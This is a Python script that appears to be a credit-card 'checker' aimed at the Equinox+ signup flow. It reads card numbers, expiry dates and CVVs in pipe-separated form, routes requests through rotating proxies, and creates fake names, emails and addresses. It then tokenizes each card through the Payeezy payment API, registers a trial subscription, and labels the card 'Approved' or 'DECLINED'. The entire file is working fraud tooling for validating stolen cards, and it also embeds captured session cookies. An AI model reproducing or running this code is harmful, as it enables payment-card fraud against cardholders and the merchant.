import requests
import AdyenEncrypt
import json
import base64
import sys
import names
import random
import rsa
import time
from parse import parseX
import uuid
import random

proxiess = "proxys.txt"

def generar_codigo_session():
    codigo_session = str(uuid.uuid4())
    return codigo_session


def payeezy(tarjeta):
    try:
        
        CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
        nombre = f'{names.get_first_name()} {names.get_last_name()}'
        session = requests.Session()
        with open(proxiess, 'r') as file:
            proxies_1 = file.read().splitlines()
            
        session = requests.Session()
        proxie = random.choice(proxies_1)

        session.proxies = {
        'https': f'{proxie}'}
        
        SessionId = generar_codigo_session()

        splitter = tarjeta.split('|')
        ccnum = splitter[0]
        mes = splitter[1]
        cvv = splitter[3]
        ano = splitter[2]
        if len(ano) == 4:
            ano = ano[2:4]
       
            

        req = requests.get(f"https://bins.antipublic.cc/bins/{ccnum[:6]}").json()      
        brand = req['brand']


        session = requests.Session()
    
        with open(proxiess, 'r') as file:
            proxies_1 = file.read().splitlines()
                
            session = requests.Session()
            proxie = random.choice(proxies_1)

        session.proxies = {
            'https': f'{proxie}'}
        
        
        headers = {
            'authority': 'www.equinoxplus.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            # 'cookie': '_vwo_uuid_v2=D2F0871D495B1EFB040AA38114994C44F|d3454c3e2e35513b798e5c032b42f7cd; ab.storage.deviceId.066a8a21-0f1b-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV22l%22%3A1708084597160%7D; __Host-next-auth.csrf-token=988f91c33f6f623b12d6f19d84d299674f23cf05bc9be3cd05e7832934a6d77e%7C416d289cd6cb69304a195cc35e88f51af5f49bce250cd1e0094e270461200a60; __Secure-next-auth.callback-url=https%3A%2F%2Fequinoxplus.com; _vis_opt_s=1%7C; _vis_opt_test_cookie=1; _vwo_uuid=D2F0871D495B1EFB040AA38114994C44F; _vwo_sn=0%3A2; _gcl_au=1.1.1271771859.1708084598; AMCVS_3B19258A5ED534210A495C5D%4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV719756354.1708084599; _gat_UA-182607015-1=1; __pdst=f1168979c65f4fdb85483b343c20a63b; _fbp=fb.1.1708084599427.227520237; AMCV_3B19258A5ED534210A495C5D%4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV7C7%7CMCAAMB-1708689398%7C6G1ynYcLPuiQxYZrsz_pkqfLG9yMXBpb2zX5dvJdYQJzPXImdj0y%7CMCOPTOUT-1708091798s%7CNONE%7CMCSYNCSOP%7C411-19777%7CvVersion%7C4.4.0; mp_cfb5df95a4a89f64f5bdd7c11bf756af_mixpanel=%7B%22distinct_id%22%3A%20%22%24device%3A18db1c69d1616aa-0824f8a02afbf7-4c657b58-100200-18db1c69d1616aa%22%2C%22%24device_id%22%3A%20%2218db1c69d1616aa-0824f8a02afbf7-4c657b58-100200-18db1c69d1616aa%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%2C%22__mps%22%3A%20%7B%7D%2C%22__mpso%22%3A%20%7B%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%7D%2C%22__mpus%22%3A%20%7B%7D%2C%22__mpa%22%3A%20%7B%7D%2C%22__mpu%22%3A%20%7B%7D%2C%22__mpr%22%3A%20%5B%5D%2C%22__mpap%22%3A%20%5B%5D%7D; __attentive_id=cce1649eccf045a08c2b238bf5ff1fee; _attn_=eyJ1Ijoie1wiY29cIjoxNzA4MDg0NjAwNDg4LFwidW9cIjoxNzA4MDg0NjAwNDg4LFwibWFcIjoyMTkwMCxcImluXCI6ZmFsc2UsXCJ2YWxcIjpcImNjZTE2NDllY2NmMDQ1YTA4YzJiMjM4YmY1ZmYxZmVlXCJ9In0=; __attentive_cco=1708084600493; _tt_enable_cookie=1; _ttp=x_IHuzDkqGTRSssJXDwT0nkHALb; rbuid=rbos-99a47f29-36a4-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV__attentive_dv=1; XSRF-TOKEN=j5rXwpIn-8USpx8Y-9CDBKbV9tCvUjwf8FrE; connect.sid=s%3AWiaQLvUaWB1eWJLl61L5bUTACEkC0yd0.lYGKmTKOjS%2FAPHKntwUXdSs4Gc8aZsL%2FR6r97jj7kDk; ab.storage.sessionId.066a8a21-0f1b-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV22c%22%3A1708084597153%2C%22l%22%3A1708084605682%7D; _ga=GA1.2.1764857231.1708084599; __attentive_domain=equinoxmedia; __attentive_ceid=VgM; __attentive_pv=2; s_fid=7353D9BA264A9083-2C1AE392CCCBA237; OptanonAlertBoxClosed=2024-02-16T11:56:50.204Z; __stripe_mid=71367b47-8f22-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV_ga_3P0S0XVRRE=GS1.1.1708084599.1.1.1708084617.4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV25252Fjoin%252523plan-selection%2526oid%253DfunctionTr%252528%252529%25257B%25257D%2526oidt%253D2%2526ot%253DSUBMIT; OptanonConsent=isGpcEnabled=0&datestamp=Fri+Feb+16+2024+11%3A56%3A58+GMT%2B0000+(Coordinated+Universal+Time)&version=6.14.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=e2254bac-6326-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV3A1%2CC0004%3A1&AwaitingReconsent=false&geolocation=DE%3B',
            #'if-none-match': '"6333-A5cmUKavtbVBF7nOTRvIFWQgGPY"',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
        }

        response = session.get('https://www.equinoxplus.com/join', headers=headers).cookies
        
        response_cookies = response.get_dict()
        xsrf_token = response_cookies.get('XSRF-TOKEN')
        print(xsrf_token)


        headers = {
            'authority': 'insight.adsrvr.org',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'referer': 'https://www.equinoxplus.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
        }

        params = {
            'adv': 'k3pq3ve',
            'ref': 'https://www.equinoxplus.com/join#plan-selection',
            'upid': 'u4pcpfl',
            'upv': '1.1.0',
        }

        response = session.get('https://insight.adsrvr.org/track/up', params=params, headers=headers)
        
        headers = {
            'authority': 'payment.equinox.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://www.equinoxplus.com',
            'referer': 'https://www.equinoxplus.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
        }

        json_data = {
            'env': 'prod',
            'gateway': 'PAYEEZY',
            'zeroDollarAuth': False,
        }

        response = session.post('https://payment.equinox.com/api/authorize-client', headers=headers, json=json_data)
        
        jsondata = response.json()
        resp = response.text
        bearer = parseX(resp, '"clientToken":"', '"')
    

        public_key_bytes = base64.b64decode(jsondata["publicKeyBase64"])


        public_key = rsa.PublicKey.load_pkcs1_openssl_pem(public_key_bytes)

        data_to_encrypt = {
            'card': ccnum,
            'exp': f'{mes}/{ano}',
            'cvv': cvv,
            'address_line1': 'Street 16th, av billonarie',
            'address_line2': '',
            'address_city': 'New York',
            'address_state': 'New York',
            'address_zip': '10080',
            'address_country': 'United States'
        }
    
        json_string = json.dumps(data_to_encrypt)

        encrypted_data = rsa.encrypt(json_string.encode('utf-8'), public_key)

        encrypted_data_base64 = base64.b64encode(encrypted_data).decode('utf-8')

        print('Encrypted Data:', encrypted_data_base64)



        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Client-Token': f'Bearer {bearer}',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
            'Origin': 'https://lib.paymentjs.firstdata.com',
            'Referer': 'https://lib.paymentjs.firstdata.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
            'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        json_data = {
            'encryptedData': encrypted_data_base64,
            'unencryptedData': {
                'name': nombre,
            },
        }

        response = session.post('https://prod.api.firstdata.com/paymentjs/v2/client/tokenize', headers=headers, json=json_data).text
        
        headers = {
            'authority': 'payment.equinox.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://www.equinoxplus.com',
            'referer': 'https://www.equinoxplus.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
        }

        response = session.get(f'https://payment.equinox.com/api/tokenize-status/{bearer}', headers=headers).text
        
        card_token = parseX(response, '"token":"', '"')
        brand = parseX(response, '"brand":"', '"')
        print(card_token, brand)
        
        if int(response.find('The card has expired')) > 0 :
            msg = "DECLINED ?"
            respuesta = "The card has expired"
            print(msg, respuesta)
            return
        
        headers = {
            'authority': 'www.equinoxplus.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            # 'cookie': '_vwo_uuid_v2=D2F0871D495B1EFB040AA38114994C44F|d3454c3e2e35513b798e5c032b42f7cd; ab.storage.deviceId.066a8a21-0f1b-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV22l%22%3A1708084597160%7D; __Host-next-auth.csrf-token=988f91c33f6f623b12d6f19d84d299674f23cf05bc9be3cd05e7832934a6d77e%7C416d289cd6cb69304a195cc35e88f51af5f49bce250cd1e0094e270461200a60; __Secure-next-auth.callback-url=https%3A%2F%2Fequinoxplus.com; _vis_opt_s=1%7C; _vis_opt_test_cookie=1; _vwo_uuid=D2F0871D495B1EFB040AA38114994C44F; _vwo_sn=0%3A2; _gcl_au=1.1.1271771859.1708084598; AMCVS_3B19258A5ED534210A495C5D%4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV719756354.1708084599; __pdst=f1168979c65f4fdb85483b343c20a63b; _fbp=fb.1.1708084599427.227520237; AMCV_3B19258A5ED534210A495C5D%4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV7C7%7CMCAAMB-1708689398%7C6G1ynYcLPuiQxYZrsz_pkqfLG9yMXBpb2zX5dvJdYQJzPXImdj0y%7CMCOPTOUT-1708091798s%7CNONE%7CMCSYNCSOP%7C411-19777%7CvVersion%7C4.4.0; mp_cfb5df95a4a89f64f5bdd7c11bf756af_mixpanel=%7B%22distinct_id%22%3A%20%22%24device%3A18db1c69d1616aa-0824f8a02afbf7-4c657b58-100200-18db1c69d1616aa%22%2C%22%24device_id%22%3A%20%2218db1c69d1616aa-0824f8a02afbf7-4c657b58-100200-18db1c69d1616aa%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%2C%22__mps%22%3A%20%7B%7D%2C%22__mpso%22%3A%20%7B%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%7D%2C%22__mpus%22%3A%20%7B%7D%2C%22__mpa%22%3A%20%7B%7D%2C%22__mpu%22%3A%20%7B%7D%2C%22__mpr%22%3A%20%5B%5D%2C%22__mpap%22%3A%20%5B%5D%7D; __attentive_id=cce1649eccf045a08c2b238bf5ff1fee; _attn_=eyJ1Ijoie1wiY29cIjoxNzA4MDg0NjAwNDg4LFwidW9cIjoxNzA4MDg0NjAwNDg4LFwibWFcIjoyMTkwMCxcImluXCI6ZmFsc2UsXCJ2YWxcIjpcImNjZTE2NDllY2NmMDQ1YTA4YzJiMjM4YmY1ZmYxZmVlXCJ9In0=; __attentive_cco=1708084600493; _tt_enable_cookie=1; _ttp=x_IHuzDkqGTRSssJXDwT0nkHALb; rbuid=rbos-99a47f29-36a4-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV__attentive_dv=1; connect.sid=s%3AWiaQLvUaWB1eWJLl61L5bUTACEkC0yd0.lYGKmTKOjS%2FAPHKntwUXdSs4Gc8aZsL%2FR6r97jj7kDk; __attentive_domain=equinoxmedia; __attentive_ceid=VgM; s_fid=7353D9BA264A9083-2C1AE392CCCBA237; OptanonAlertBoxClosed=2024-02-16T11:56:50.204Z; __stripe_mid=71367b47-8f22-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVkNs5GuuI1fil5mQ5auNd2CEI68s; __attentive_pv=3; _ga=GA1.2.1764857231.1708084599; snlPageCount=5; _ga_3P0S0XVRRE=GS1.1.1708084599.1.1.1708084658.1.0.0; OptanonConsent=isGpcEnabled=0&datestamp=Fri+Feb+16+2024+11%3A57%3A39+GMT%2B0000+(Coordinated+Universal+Time)&version=6.14.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=e2254bac-6326-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV3A1%2CC0004%3A1&AwaitingReconsent=false&geolocation=DE%3B; s_sq=eqmllc.variis.global.prod%3D%2526c.%2526a.%2526activitymap.%2526page%253Dhttps%25253A%25252F%25252Fwww.equinoxplus.com%25252Fjoin%252523payment-details%2526link%253DContinue%2526region%253D__next%2526.activitymap%2526.a%2526.c%2526pid%253Dhttps%25253A%25252F%25252Fwww.equinoxplus.com%25252Fjoin%252523payment-details%2526oid%253DContinue%2526oidt%253D3%2526ot%253DSUBMIT; ab.storage.sessionId.066a8a21-0f1b-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV22c%22%3A1708084597153%2C%22l%22%3A1708084735146%7D',
            'csrf-token': xsrf_token,
            'origin': 'https://www.equinoxplus.com',
            'referer': 'https://www.equinoxplus.com/join',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
        }

        json_data = {
            'name': nombre,
            'exp': {
                'month': mes,
                'year': f'20{ano}',
            },
            'brand': brand,
            'token': card_token,
        }

        response = session.post('https://www.equinoxplus.com/api/validatePayeezyCard', headers=headers, json=json_data).text
        
        print(response)
        
        if "Payment could not be processed, please try again" in response:
            msg = "DECLINED ❌"
            respuesta = "Payment could not be processed, please try again"
            print(msg, respuesta)
            
            return msg, respuesta
          
    
            
        
        headers = {
            'authority': 'www.equinoxplus.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            # 'cookie': 'connect.sid=s%3Af7bG-SyjuX3nzG1yNDjNGuOmd7Bqu0RK.Z0IeB8Wawq4BBKQgXme2rX8WT4xb8okMMqaXTqh0UzU; _gcl_au=1.1.4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVAMCVS_3B19258A5ED534210A495C5D%40AdobeOrg=1; __attentive_id=bb173a3a87ae40cfbf64c74c5d5a16be; _attn_=eyJ1Ijoie1wiY29cIjoxNzA4NDU5ODE4MjIxLFwidW9cIjoxNzA4NDU5ODE4MjIxLFwibWFcIjoyMTkwMCxcImluXCI6ZmFsc2UsXCJ2YWxcIjpcImJiMTczYTNhODdhZTQwY2ZiZjY0Yzc0YzVkNWExNmJlXCJ9In0=; __attentive_cco=1708459818239; lantern=b88b91e2-8380-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVwkXFw2CyLK8bMcQSSuZp80Q_cda; AMCV_3B19258A5ED534210A495C5D%4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV7C7%7CMCAAMB-1709064617%7C6G1ynYcLPuiQxYZrsz_pkqfLG9yMXBpb2zX5dvJdYQJzPXImdj0y%7CMCOPTOUT-1708467017s%7CNONE%7CMCSYNCSOP%7C411-19781%7CvVersion%7C4.4.0; __attentive_dv=1; _fbp=fb.1.1708459820056.1845727629; s_fid=3195F4C254D0934A-33129E9FB257AE90; __stripe_mid=92265a8b-c731-49ff-9b50-1e35ff6499825b3575; __Host-next-auth.csrf-token=f0f2dde2af91c5980affbd94dd516de096c025baddca6444fcb93da48659d45b%7C21cf64a2c7779ab57e8c2e632c818e9a2b51f1de84be422b00768c74de999c93; __Secure-next-auth.callback-url=https%3A%2F%2Fequinoxplus.com; _vwo_uuid_v2=D9F4BE82B6ABAF14C7AFB99BC528F841B|4a64a945c2366f433f0d97f83bcb2ab1; ab.storage.deviceId.066a8a21-0f1b-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV22l%22%3A1708496447608%7D; _vis_opt_s=1%7C; _vis_opt_test_cookie=1; _vwo_uuid=D9F4BE82B6ABAF14C7AFB99BC528F841B; _vwo_ds=3%3Aa_0%2Ct_0%3A0%241708496448%3A53.4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV24device%3A18dca52f14e126e-021a6a26fe6f42-4c657b58-100200-18dca52f14e126e%22%2C%22%24device_id%22%3A%20%2218dca52f14e126e-021a6a26fe6f42-4c657b58-100200-18dca52f14e126e%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%2C%22__mps%22%3A%20%7B%7D%2C%22__mpso%22%3A%20%7B%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%7D%2C%22__mpus%22%3A%20%7B%7D%2C%22__mpa%22%3A%20%7B%7D%2C%22__mpu%22%3A%20%7B%7D%2C%22__mpr%22%3A%20%5B%5D%2C%22__mpap%22%3A%20%5B%5D%7D; __attentive_domain=equinoxmedia; __attentive_ceid=VgM; __stripe_sid=115747f6-00a4-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV1708459816; __attentive_pv=1; __attentive_ss_referrer=ORGANIC; ab.storage.sessionId.066a8a21-0f1b-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV22c%22%3A1708499133071%2C%22l%22%3A1708499550278%7D; snlPageCount=14; _ga_3P0S0XVRRE=GS1.1.1708499138.3.1.1708499553.60.0.0; OptanonConsent=isIABGlobal=false&datestamp=Wed+Feb+21+2024+02%3A12%3A36+GMT-0500+(Colombia+Standard+Time)&version=6.14.0&hosts=&consentId=f132922b-b72c-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV3A1%2CC0002%3A1&isGpcEnabled=0&browserGpcFlag=0&AwaitingReconsent=false; s_sq=eqmllc.variis.global.prod%3D%2526c.%2526a.%2526activitymap.%2526page%253Dhttps%25253A%25252F%25252Fwww.equinoxplus.com%25252Fjoin%252523payment-details%2526link%253DStart%252520complimentary%2525207-day%252520trial%2526region%253D__next%2526.activitymap%2526.a%2526.c%2526pid%253Dhttps%25253A%25252F%25252Fwww.equinoxplus.com%25252Fjoin%252523payment-details%2526oid%253DfunctionTr%252528%252529%25257B%25257D%2526oidt%253D2%2526ot%253DSUBMIT',
            'csrf-token': xsrf_token,
            'origin': 'https://www.equinoxplus.com',
            'referer': 'https://www.equinoxplus.com/join',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
        }

        json_data = {
            'firstName': names.get_first_name(),
            'lastName': names.get_last_name(),
            'email': CorreoRand,
            'password': 'Kurama#1212',
            'billingInfo': {
                'bin': ccnum[:6],
                'brand': 'discover',
                'exp': {
                    'month': mes,
                    'year': f'20{ano}',
                },
                'last4': ccnum[12:16],
                'masked': f'XXXXXXXXXXXX{ccnum[12:16]}',
                'name': nombre,
                'token': card_token,
                'country': 'US',
                'address_line1': 'street 16th bilolonarie',
                'address_city': 'New York',
                'address_state': 'NY',
                'address_zip': '10080',
            },
            'isAmex': False,
            'trialDays': 7,
            'corpName': '',
            'genId': '',
            'source': 'Digital Only',
            'sourceSystemID': '1',
            'subscriptionType': 'monthly',
            'rate': 39.99,
            'isAvalaraEnabled': False,
        }

        response = session.post('https://www.equinoxplus.com/api/registerEquinoxTrial', headers=headers, json=json_data).text
        
        
        print(response)
        time.sleep(2)
        if int(response.find('equinoxTrackingId')) > 0 :
            msg = "Approved Auth! ✅"
            respuesta = "Successful Subscription"
            print(msg, respuesta)
        
        
        session.close()   
        print(msg, "PAYEEZY MAX")       
        return msg, respuesta
                
    
    except Exception as e:
        print("Se produjo una excepción:", e)
        msg = "DECLINED! ❌"
        respuesta = "You card was declined"
        
        return msg, respuesta
   

